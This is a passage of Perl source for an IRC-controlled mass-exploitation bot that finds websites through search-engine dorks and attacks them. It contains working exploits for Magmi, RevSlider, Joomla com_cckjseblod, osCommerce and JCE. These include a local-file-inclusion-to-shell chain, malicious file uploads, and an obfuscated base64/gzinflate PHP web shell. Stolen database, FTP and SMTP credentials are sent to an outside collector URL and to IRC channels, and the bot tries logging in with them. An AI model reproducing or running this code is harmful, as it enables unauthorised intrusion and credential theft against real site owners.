		my $bug = "/magmi/web/ajax_pluginconf.php?file=";
		my $dir = "../../../../../../../../../../../";
		
            my $test = "http://".$site.$bug.$dir."/etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility";
            my $vuln = "http://".$site."magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../proc/self/environ&plugintype=utilities&pluginclass=CustomSQLUtility";
      		my $htmlx = &get_content($testx);
            my $shell = "http://".$site."/magmi/web/rss.php";;
            my $html = get_content($vuln);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT=/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $sys = $1;
                            my $code = 'echo "s4l1ty#".php_uname()."#s4l1ty"; if(@copy("'.$lfiinjector.'","/")) { echo "SUCCESS"; }';
                            my $version = 'echo "Indonesiancoder".php_uname().';
                            my $upload = 'system("wget '.$lfishell.' -O rss.php");';
							my $upload1 = 'system("wget '.$lfishell.' -O rss.php");';
                            my $wget = lfi_env_query($vuln,encode_base64($upload)); sleep(2);
							my $wget1 = lfi_env_query($test,encode_base64($upload1)); sleep(2);
                            my $check = get_content("http://".$site."/magmi/web/rss.php"); sleep(1);
                            if ($check =~ /GIF675ER/) {
                            	if ($check =~ /Kernel:(.*?)<\/b>/){$os=$1;}
		                           &msg("$admin","$magelogo15(09@03$engine15)04 ".$shell." 15(9@3".$os."15)");
		                           &msg("$chan","$magelogo15(09@03$engine15)04 ".$site." 15(9@3".$os."TusbolleD15) TusBoleD");
		                           sleep(2); 
		                        } else {
                                   &msg("$chan","$magelogo15(09@3$engine15)15(09@04SysTem15)4 ".$vuln." 15(09@03".$sys."15) VulN");

                                sleep(2);
                            }
                        } exit; }                    
		            }
		        }
			}
		}
	}
}

sub lfi_env_query() {
	my $url = $_[0];
	my $code = $_[1];
	my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
	$ua->timeout(7);
	my $req = HTTP::Request->new(GET => $url);
	my $res = $ua->request($req);
	return $res->content;
}

sub mageupl() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$magelogo);
	    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","$magelogo14(4$engine14)3 Finished..."); }
    	my $test = "http://".$site."/magmi/web/magmi.php";
    	my $test1 = "http://".$site."/magmi/conf/magmi.ini";
		my $crot = "http://".$site."/magmi/web/plugin_upload.php";			
    	my $htmlx = magento_query($crot);sleep(1);
		my $htmlx = magentox_query($test);sleep(1);
		my $html = &get_content($test);
		my $html1 = &get_content($test1);

            if ($html =~ /magmi_saveconfig.php/){          
            &msg("$chan","$magelogo 6 4 Hacked 6 http://".$site."magmi/web/magmi.php");}

           	if ($html1 =~ /DATABASE/){
			&get_content("".$botsaver."?x=-MAGMI- http://".$site."magmi/conf/magmi.ini");                     
            &msg("$chan","$magelogo 6 4 Hacked 6 http://".$site."magmi/conf/magmi.ini");}
			
			if ($htmlx =~ /Plugin packaged installed/){
			&get_content("".$botsaver."?x=-UPLOADER- http://".$site."magmi/web/magmi.php");
			#&msg("$chan","$magelogo(11,1$engine11)8 http://".$site."magmi/web/magmi.php");
			&msg("$admin","$magelogo(13,1$engine13)8 http://".$site."magmi/web/magmi.php");}
		my $check = &get_content("http://".$site."magmi/plugins/rss.php");sleep(1);
			if ($check =~ /GIF675ER/) {
			&get_content("".$botsaver."?x=-SHELL- http://".$site."/magmi/plugins/rss.php"); 		
			&msg("$admin","7,1[47] http://".$site."/magmi/plugins/rss.php 9"); 
			}			
		}
	}
}

sub magento_query() {
		my $url = $_[0];
		my $ua  = LWP::UserAgent->new(agent => $uagent);
		$ua->timeout(20);
			my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["plugin_package"=>["$mag_shell"]]);
			return $req->content;
}

sub magentox_query() {
		my $url = $_[0];
		my $ua  = LWP::UserAgent->new(agent => $uagent);
		$ua->timeout(20);
		my $req = $ua->post($url,Content_Type=>'multipart/form-data',Content=>["plugin_package"=>["$mag_shell"]]);
		return $req->content;
}

sub revlfd() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$revlogo);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
		if ($count == $num-1) { &msg("$chan","$revlogo 4$engine 0 Selesai"); }
		my $test = "http://".$site."/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";    
            my $html = &get_content($test);
        if ($html =~ /DB_NAME/i ) 
        {
            
            if ($html =~ /\DB_NAME\', '(.*)'\);/) {$dbrev=$1;}
            if ($html =~ /\DB_USER\', '(.*)'\);/) {$userrev=$1;}
            if ($html =~ /\DB_PASSWORD\', '(.*)'\);/) {$passrev=$1;}
            if ($html =~ /\DB_HOST\', '(.*)'\);/) {$hostrev=$1;}
            my $check = &get_content("http://".$site."phpmyadmin");
            if ($check =~ /phpMyAdmin/) {
			&get_content("".$botsaver."?x=-PHPMYADMIN- http://".$site."phpmyadmin");
            #&msg("$chan","$revlogo9(4@9phpMyAdmin) http://".$site."phpmyadmin");
            &msg("$admin","$revlogo9(4@9phpMyAdmin) http://".$site."phpmyadmin");
        }
            my $checker = &get_content("http://".$site."phpinfo.php");
            if ($checker =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."phpinfo.php");
            #&msg("$chan","$revlogo9(4@9Info) http://".$site."phpinfo.php");
            &msg("$admin","$revlogo9(4@9Info) http://".$site."phpinfo.php");
        }
            my $checkerz = &get_content("http://".$site."info.php");
            if ($checkerz =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."info.php");
            #&msg("$chan","$revlogo9(4@9Info) http://".$site."info.php");
            &msg("$admin","$revlogo9(4@9Info) http://".$site."info.php");
        }
			&get_content("".$botsaver."?x=-DATABASE- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBNname:".$dbrev."");
            &msg("$admin","$revlogo13[+]Database[+] http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." ");
            &msg("$chan","$revlogo13[+]Database[+] http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." ");        
                            if ($userrev =~ /_/) {@users = split("_", $userrev); $usr = $users[0];}
            
            my $ceklog = "".$ftpxpl."?host=".$site."&user=".$usr."&pass=".$passrev."";
            my $ceklog2 = "".$ftpxpl."?host=".$site."&user=".$userrev."&pass=".$passrev."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
                if ($ftplog =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$passrev."");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$passrev."");
                }
                if ($ftplog2 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$userrev." - Password:".$passrev."");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$userrev." [+]password:".$passrev."");
                }
            my $ngecek = "http://".$site.":".$portcpanel."";
            my $port = "3306";
            my $platform = "mysql";
            my $dsn = "dbi:$platform:$dbrev:$site:$port";
            my $DBIconnect=  DBI->connect($dsn,$userrev,$passrev);
        if ($DBIconnect) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBName:".$dbrev."");
        #&msg("$chan","$revlogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
        &msg("$admin","$revlogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
    }
            my $dsn2 = "dbi:$platform:$dbname:$hostrev:$port";
            my $DBIconnect2=  DBI->connect($dsn2,$userrev,$passrev);
        if ($DBIconnect2) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBName:".$dbrev."");
        #&msg("$chan","$revlogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$serverIP." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
        &msg("$admin","$revlogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$serverIP." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
    	}}}
	}
}

sub revshell(){
my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$revlogo);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
		if ($count == $num-1) {
		#&msg("$chan","$revlogo 4$engine 0 Selesai");
		}
		my $test = "".$revxpl."?target=http://".$site."/&x=rev";
            my $html = &get_content($test);
            if($html =~ /Sukses Bos/i){
            if($html =~ /path:(.*)<br>/){$path=$1;}
            my $shell = "http://".$site.$path;
            my $jos = &get_content($shell);
            my $lel = $shell."?x=kernel";
            my $lol = &get_content($lel);
            &msg("$chan","$revlogo $engine <=> Sukses <=> http://".$site);
                if($jos =~ /GIF675ER/i){
		            &get_content("".$botsaver."?x=-SHELL- ".$shell." [OS: ".$lol."]");
		            &msg("$admin","$revlogo 7 <=> sHeLL <=> ".$shell." 4".$lol."");
		            #&msg("$chan","$revlogo  7 <=> sHeLL <=> ".$shell." 4".$lol."");
        		}
        	}
    	}
	}
}

sub osco_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
		if ($count == $num-1) { &msg("$chan","$oscologo 4$engine 0 Selesai"); }
			my $cat = "http://".$site."admin/categories.php/login.php";
			my $fm = "http://".$site."admin/file_manager.php/login.php";
			my $bm = "http://".$site."admin/banner_manager.php/login.php";
			my $shell = "http://".$site."images/lobex.php";
				my $coba = &get_content($cat);
				my $cob2 = &get_content($fm);
				my $cob3 = &get_content($bm);
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				if ($coba =~ /TABLE_HEADING_CATEGORIES_PRODUCTS/i ) {
					my $test = $cat."?action=download&filename=/includes/configure.php";
					my $cek = &get_content($test);
					if ($cek =~ /http:\/\//) {
						&osql_xpl($test,$chan,$site,$engine);
					}
					my $aplod = LWP::UserAgent->new;
					my $res = $aplod->post($cat."?cPath=&action=new_product_preview",['products_image' => ['./lobex.jpg' => 'lobex.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res->as_string;
					my $cekap = &get_content($shell);
					if ($cekap =~ /GIF675ER/) {
						if ($cekap =~ /Kernel:(.*?)<\/b>/){$os=$1;}
						&msg("$chan","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 http://".$site."15 (OS=$os) ");
						&msg("$admin","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 $shell15 (OS=$os) ");sleep(1);
					}
				}
				if ($cob2 =~ /TABLE_HEADING_FILENAME/i) {
					my $test2 = $fm."?action=download&filename=/includes/configure.php";
					my $cek2 = &get_content($test2);
					if ($cek2 =~ /http:\/\//) {
						&osql_xpl($test2,$chan,$site,$engine);
					}
					my $aplod2 = LWP::UserAgent->new;
					my $res2 = $aplod2->post($fm."?action=processuploads",['file_1' => ['./lobex.jpg' => 'lobex.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res2->as_string;
					my $cekap = &get_content($shell);
					if ($cekap =~ /GIF675ER/) {
						if ($cekap =~ /Kernel:(.*?)<\/b>/){$os=$1;}
						&msg("$chan","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 http://".$site."15 (OS=$os) ");
						&msg("$admin","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 $shell15 (OS=$os) ");sleep(1);
					}
				}
				if ($cob3 =~ /TABLE_HEADING_BANNERS/i) {
					my $test3 = $bm."?action=download&filename=/includes/configure.php";
					my $cek3 = &get_content($test3);
					if ($cek3 =~ /http:\/\//) {
						&osql_xpl($test3,$chan,$site,$engine);
					}
					my $aplod3 = LWP::UserAgent->new;
					my $res3 = $aplod3->post($bm."?action=insert",['banners_image' => ['./lobex.jpg' => 'lobex.php' => 'application/octet-stream']],'Content-Type' => 'form-data'); $res3->as_string;
					my $cekap = &get_content($shell);
					if ($cekap =~ /GIF675ER/) {
						if ($cekap =~ /Kernel:(.*?)<\/b>/){$os=$1;}
						&msg("$chan","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 http://".$site."15 (OS=$os) ");
						&msg("$admin","$oscologo15$engine 4<9=4>9 sHeLL 4<9=4>9 $shell15 (OS=$os) ");sleep(1);
					}
				}
				} exit;
			}
		}
	}
}


sub osql_xpl() {
	my $url    = $_[0];
	my $chan   = $_[1];
	my $site   = $_[2];
	my $engine = $_[3];
	my $request = HTTP::Request->new(GET=>$url);
	my $browser = LWP::UserAgent->new();
	$browser->timeout(10);
	my $response = $browser->request($request);
	my @dbsinfo;
	if ($response->is_success) {
		my $dpath = ""; my $dbserver = ""; my $dbuser = ""; my $dbpass = ""; my $dbname = "";
		my $res = $response->as_string;
		if ($res =~ m/'DIR_FS_CATALOG', '(.*)'/g) {
			$dpath = $1;
			&msg("$chan","$oscologo15$engine 4<9=4>9 http://".$site." 15[+]DIR Path: 4 $dpath");
		}
		if ($res =~ m/'DB_SERVER', '(.*)'/g) {
			$dbserver = $1;
			&msg("$chan","$oscologo15$engine 4<9=4>9 http://".$site." 15[+]DB Server: 4 $dbserver");
		}
		if ($res =~ m/'DB_SERVER_USERNAME', '(.*)'/g) {
			$dbuser = $1;
			&msg("$chan","$oscologo15$engine 4<9=4>9 http://".$site." 15[+]DB Username: 4 $dbuser");
		}
		if ($res =~ m/'DB_SERVER_PASSWORD', '(.*)'/g) {
			$dbpass = $1;
			&msg("$chan","$oscologo15$engine 4<9=4>9 http://".$site." 15[+]DB Password: 4 $dbpass");
		}
		if ($res =~ m/'DB_DATABASE', '(.*)'/g) {
			$dbname = $1;
			&msg("$chan","$oscologo15$engine 4<9=4>9 http://".$site." 15[+]DB Database: 4 $dbname");
		}
		my $hosts = "http://".$site;
		if($hosts =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
			$host = $2;
			&dbi_connect($host,$dbuser,$dbpass,$dbname,$chan,$engine,$oscologo);sleep(1);
			if ($dbuser =~ /_/) { my @users = split("_",$dbuser); my $dbuser = $users[0]; }
			&ftp_connect($url,$host,$dbuser,$dbpass,$chan,$engine,$oscologo);sleep(1);
		}
	}
}

sub joomla_xpl() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$joomlalogo);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
		if ($count == $num-1) { &msg("$chan","$joomlalogo 4$engine 0 Selesai"); }
		my $test = "http://".$site."/index.php?option=com_cckjseblod&task=download&file=configuration.php";    
            my $html = &get_content($test);
        if ($html =~ /class JConfig/i ) 
        {
            
            if ($html =~ m/\$db = '(.+?)';/i) {$dbrev=$1;}
            if ($html =~ m/\$user = '(.+?)';/i) {$userrev=$1;}
            if ($html =~ m/\$password = '(.+?)';/i) {$passrev=$1;}
            if ($html =~ m/\$host = '(.+?)';/i) {$hostrev=$1;}
 			if ($html =~ m/\$ftp_host = '(.+?)';/i){$ftphost=$1;}
 			if ($html =~ m/\$ftp_user = '(.+?)';/i){$ftpuser=$1;}
 			if ($html =~ m/\$ftp_pass = '(.+?)';/i){$ftppass=$1;}
 			if ($html =~ m/\$ftp_enable = '(.+?)';/i){$ftpopen=$1;}
 			if ($html =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}
 			if ($html =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}
 			if ($html =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}
 			if ($html =~ m/\$smtpauth = '(.+?)';/i){$smtpauth=$1;} 
 			if ($smtpauth =~ /1/) {
				&get_content("".$botsaver."?x=-SMTP- Host: ".$smtphost." - Login: ".$smtpuser." - Pass: ".$smtppass."");
				&msg("$chan","9[SMTP] Found on http://$site ");
				&msg("$admin","9[SMTP] [ host : ".$smtphost." ] [ login : ".$smtpuser." ] [ pass : ".$smtppass." ]");
			}
            my $check = &get_content("http://".$site."phpmyadmin");
            if ($check =~ /phpMyAdmin/) {
			&get_content("".$botsaver."?x=-PHPMYADMIN- http://".$site."/phpmyadmin");
            #&msg("$chan","$joomlalogo9(13@9phpMyAdmin) http://".$site."/phpmyadmin");
            &msg("$admin","$joomlalogo9(13@9phpMyAdmin) http://".$site."/phpmyadmin");
        }
            my $checker = &get_content("http://".$site."phpinfo.php");
            if ($checker =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."phpinfo.php");
            #&msg("$chan","$joomlalogo9(13@9Info) http://".$site."phpinfo.php");
            &msg("$admin","$joomlalogo9(13@9Info) http://".$site."phpinfo.php");
        }
            my $checkerz = &get_content("http://".$site."info.php");
            if ($checkerz =~ /DOCUMENT_ROOT/) {
			&get_content("".$botsaver."?x=-PHPINFO- http://".$site."info.php");
            #&msg("$chan","$joomlalogo9(@Info) http://".$site."info.php");
            &msg("$admin","$joomlalogo9(@Info) http://".$site."info.php");
        }
			&get_content("".$botsaver."?x=-DATABASE- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBName:".$dbrev."");
            &msg("$admin","$joomlalogo13[+]Database[+] http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." ");
            &msg("$chan","$joomlalogo13[+]Database[+] http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." ");        
                if ($userrev =~ /_/) {@users = split("_", $userrev); $usr = $users[0];}
            
            my $ceklog = "".$ftpxpl."?host=".$site."&user=".$usr."&pass=".$passrev."";
            my $ceklog2 = "".$ftpxpl."?host=".$site."&user=".$userrev."&pass=".$passrev."";
            my $ceklog3 = "".$ftpxpl."?host=".$ftphost."&user=".$ftpuser."&pass=".$ftppass."";
            my $ftplog = &get_content($ceklog);
            my $ftplog2 = &get_content($ceklog2);
            my $ftplog3 = &get_content($ceklog3);
                if ($ftplog =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$usr." - Password:".$passrev."");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$usr." [+]password:".$passrev."");
                }
                if ($ftplog2 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ftp://".$site." - Username:".$userrev." - Password:".$passrev."");
                    &msg("$admin","8[+]FTP[+] ftp://".$site." [+]username:".$userrev." [+]password:".$passrev."");
                }
                if ($ftplog3 =~ /FTP success!/) {
					&get_content("".$botsaver."?x=-FTP- ".$ftphost." - Username:".$ftpuser." - Password:".$ftppass."");
                    &msg("$admin","8[+]FTP[+] ".$ftphost." [+]username:".$ftpuser." [+]password:".$ftppass."");
                }
            my $ngecek = "http://".$site.":".$portcpanel."";
            my $port = "3306";
            my $platform = "mysql";
            my $dsn = "dbi:$platform:$dbrev:$site:$port";
            my $DBIconnect=  DBI->connect($dsn,$userrev,$passrev);
        if ($DBIconnect) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBName:".$dbrev."");
        #&msg("$chan","$joomlalogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
        &msg("$admin","$joomlalogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$hostrev." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
    }
            my $dsn2 = "dbi:$platform:$dbname:$hostrev:$port";
            my $DBIconnect2=  DBI->connect($dsn2,$userrev,$passrev);
        if ($DBIconnect2) {
		&get_content("".$botsaver."?x=-MYSQL- http://".$site." - Hostname:".$hostrev." - Username:".$userrev." - Password:".$passrev." - DBName:".$dbrev."");
        #&msg("$chan","$joomlalogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$serverIP." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
        &msg("$admin","$joomlalogo9[+]MYSQL[+] 15[ 9http://".$site." [+]hostname:".$serverIP." [+]username:".$userrev." [+]password:".$passrev." [+]dbname:".$dbrev." 15] [4 Connected 15]");
    }
	}
   	}
	}
}

sub jce_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @list = &search_engine($chan,$bug,$dork,$engine,$jcelogo,$nick);
	my $num = scalar(@list);
	if ($num > 0){
		foreach my $site(@list){
		$count++;
			my $shell = "http://".$site."images/stories/arhy.php";
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
			my $nick = $simpan;
			my $status = &jce_upload($site);&jce_upload($site);
			if ($status = 1) {
			my $check = &get_content($shell."?rf");
				if ($check =~ /VitoShell/) {
				my $safe = ""; my $os = ""; my $uid = "";
								my $ftphost = ""; my $ftpuser = ""; my $ftppass = ""; my $ftpopen = "";
 				my $smtphost = ""; my $smtpuser = ""; my $smtppass = ""; my $smtpauth = "";
 				if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}
 				if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}
 				if ($check =~ /uid=(.*?)gid=/){$uid=$1;}
 				if ($check =~ m/\$ftp_host = '(.+?)';/i){$ftphost=$1;}
 				if ($check =~ m/\$ftp_user = '(.+?)';/i){$ftpuser=$1;}
 				if ($check =~ m/\$ftp_pass = '(.+?)';/i){$ftppass=$1;}
 				if ($check =~ m/\$ftp_enable = '(.+?)';/i){$ftpopen=$1;}
 				if ($check =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}
 				if ($check =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}
 				if ($check =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}
 				if ($check =~ m/\$smtpauth = '(.+?)';/i){$smtpauth=$1;} 
 				if ($smtpauth =~ /1/) {
					&get_content("".$botsaver."?x=-SMTP- Host: ".$smtphost." - Login: ".$smtpuser." - Pass: ".$smtppass."");
					&msg("$chan"," [SMTP] Found on http://$site ");
					&msg("$admin"," [SMTP] [ host : ".$smtphost." ] [ login : ".$smtpuser." ] [ pass : ".$smtppass." ]");
				}
				&get_content("".$botsaver."?x=-SHELL- $shell SafeMode=$safe OS=$os uid=$uid");
				&msg("$chan","$jcelogo4Send1 8Target 9TO Gay 14$nick 4<9=4> (SafeMode=$safe) (OS=$os) uid=$uid ");
				&msg("$admin","$jcelogo15$engine 4<9=4>9 sHeLL 4<9=4>9 $shell15 (SafeMode=$safe) (OS=$os) uid=$uid ");
				if (defined($ftpuser)){
				my $hozt = $site;
				$hozt =~ s/\///;
				&ftp($hozt,$ftpuser,$ftppass,$admin);
				}
			}
			}
		} exit;
			}
		if ($count == $num-1) { &msg("$chan","$jcelogo4$engine 12Finished 4for 12$dork "); }
		}
	}
}

sub jce_upload() {
my $success = 0;
my $url = $_[0];
$url =~ s/http:\/\///;
my $host = $url;
my $path = $url;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$path =~ s/(.*)\/[^\/]*$/\1/;
$path .= "/";
$path =~ s/([-a-zA-Z0-9\.]+)/$2/;
if ($path eq "") { $path = "/" }
$header1P = "POST ".$path."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1"; 
$header1P2 = "POST ".$path."index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1"; 
$header2 = "Host: $host"; 
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)"; 
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334"; 
$header5 = "Content-Length: 5000"; 
$header6 = "-----------------------------41184676334"; 
$header7 = 'Content-Disposition: form-data; name="upload-dir"'; 
$header8 = '/'; 
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""'; 
$header10 = 'Content-Type: application/octet-stream'; 
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"'; 
$header12 = "0"; 
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="arhy.php.gif"'; 
$header14 = 'Content-Type: image/gif'; 
$header15 = 'GIF89aGvito';
$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('rUl6QuM4EP58VfwH46uURwspe6eTEEO0HISj0k65puwXQJGbuK2XJI55h9JQ/PebsZO+LCzHrraq1HFen2xzPC5KV6pL8UUqI4qJv9s+2NwQcOJiCa258VtkFFNEr39s443YF2nv3bXbvzx6YbQehBYmkUhuVZfsgkZ4xlTwiA6Dz+Hghp4Ph0rxbD8a0jtHi+LLmm0Q/mYdU8P4bdBmBiOZzsGCspSROSsmBDxrb8h6gaHRn6KZc3Ce76YcWT+JT8QTQOmhMM5yyr0F/oVumzy1NEIqJcwcwlTHdG580T8NIUD/7IwePGJh8FnzN6wuwcim5qrkqgsZp0Wb0bxgOfcXFWzuNz4+PR0AWmjN/N5VBU6+5TQIL/rDY8UpdCLzKUZvwgr+uPd2goIgkTndJtSSUbfpOdMiI39vVEtOpsaU+51BUBMQ1kdlW/SuVcTVA1QMaAG3BQF2z7IrFYgbmNSCftHxusFYnl5LfPhgCRJwv5mav8LhjZdxsuA4MTgwTUkq4asj4FIng97VMD7r/R1eHl+Enh2DlHgjVWp2aNo/ub4IL4fxoN8fbWoB7czKHUQkTAWm+KxSXnM8KKclDojijm6XYpu4gHpKwEKcnv1qWs++mx4wV6aS0FAjWcaPPgsjoynPssOOExyO1BGCr63GEo6VFv/y7mIkkRk06dc9+wHDIxosRQX0sDNNOLdAGErQ4y71dgCVxSAAOowV+u2Att+b4xocAHsl0q6NlM/hESIsRQSUWZbKydfKSEvvyoc9g4QUuxhKtoPt9TDjqlWMkAUpdJCM4FUls9SdrARSYQBbSEobpVepfdRiex3Pzp9IeqEu44VItWo+ok9kRqmCoCQA46ahQitlO9y1/LUUt7ffkwOsv52kQYSUbECZylaOiwOYvsJaV5jloFjp0duEnsg8dFLaEGsoirIyxMxY3qWGPxpXkOMuWvKUrnijd5SLpd7FoeSBcpV9vwf7DiI78g7WkWV1kA2RSpkRJUbG2u2kzLAGbEYOSfM/JVyXmXEpORMZt3Jn0PpSNUaRpryo0XeHfc1gDP61GnQTX3adZs9SexPFJZ9M732yCm8lPrLpvD/+ROcp+AwfKFYypmjXsDUHB7LW0ZFMY+sKXqNqcqMicDeeZmFpd3I9RYHLvVyega2WxdH41GPA6ckq7A7GpRvdaw0l3h3YTCM7h7l84LGLztMYDfxKXVlexs4NFu0CWmDT1GB+Vyis1u2RcyrgReQp7oV04vYvTNNUSJJjrYkBRPBoOEte+6eEHpB0e9pekFwPfcMynBFYTK3MRntE1XitR3xogn5iJnXXfmBMeNzzMX/kiY+R7ElmUNROX7q2Tdavz3wJTtYYloofhSC/C4MaNxDUGABgs297s4A33CwaLpqgA19rH4tWpRgeZXsVtxuA4Ln674H8AHcv03EncN6rwP8D')))); ?> ";
$header17 = 'Content-Disposition: form-data; name="upload-name"'; 
$header18 = 'arhy.php'; 
$header19 = 'Content-Disposition: form-data; name="action"'; 
$header20 = 'upload'; 
$header21 = "-----------------------------41184676334--"; 
$header22 = 'X-Request: JSON'; 
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8'; 
$header25 = 'json={"fn":"folderRename","args":["/arhy.php.gif","arhy.php"]}'; 
$header24 = "Content-Length: ".length($header25)."";
my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host" ,PeerPort=>"80") || return;
print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n";
my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host" ,PeerPort=>"80") || return;
print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
while ($hasil = <$remote>) {
if ($hasil =~ /200 OK/) {
$success = 1;
}
return $success;
}
}
##################################################################################

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
